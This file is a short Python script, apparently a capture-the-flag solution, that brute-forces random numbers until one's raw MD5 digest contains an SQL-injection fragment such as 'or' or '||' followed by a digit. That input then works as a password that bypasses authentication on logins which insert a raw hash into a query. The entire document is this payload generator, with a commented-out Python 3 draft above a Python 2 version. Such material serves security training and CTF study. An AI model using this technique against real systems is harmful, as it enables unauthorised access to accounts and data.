# from hashlib import md5
# import random
# import os
# target = b"'or'"

# for j in range(0, 999999999999999):
    # i = random.randint(100000000000000000000000000000000000000, 999999999999999999999999999999999999999)
    # bts = str(i).encode()
    # hash = md5(bts).digest()
    # if target in hash and 49<=hash[hash.index(b"'or'") + 4]<=57:
        # print("Here you go!:", bts)
        # break
    # elif j % 10000000 == 0:
        # print("Hash :", bts)
        # print("target :", target)
        
        
import hashlib
import random
part1 = "'or'"
part2 = "'||'"
part3 = "'||1#"
part4 = "'or1#"
ctnue = 1
while ctnue:
    s = str(random.getrandbits(128))
    m = hashlib.md5()
    m.update(s)
    hashstr = m.digest()
    if part1 in hashstr:
    	next = hashstr.index(part1) + 4
    	if 49<=ord(hashstr[next])<=57:
    		ctnue = 0
    		print s
	        print hashstr
    if part2 in hashstr:
     	next = hashstr.index(part2) + 4
    	if 49<=ord(hashstr[next])<=57: 
    		ctnue = 0  	
    		print s
    		print hashstr
    if part3 in hashstr:
    		ctnue = 0  	
    		print s
    		print hashstr
    if part4 in hashstr:
    		ctnue = 0  	
    		print s
    		print hashstr 
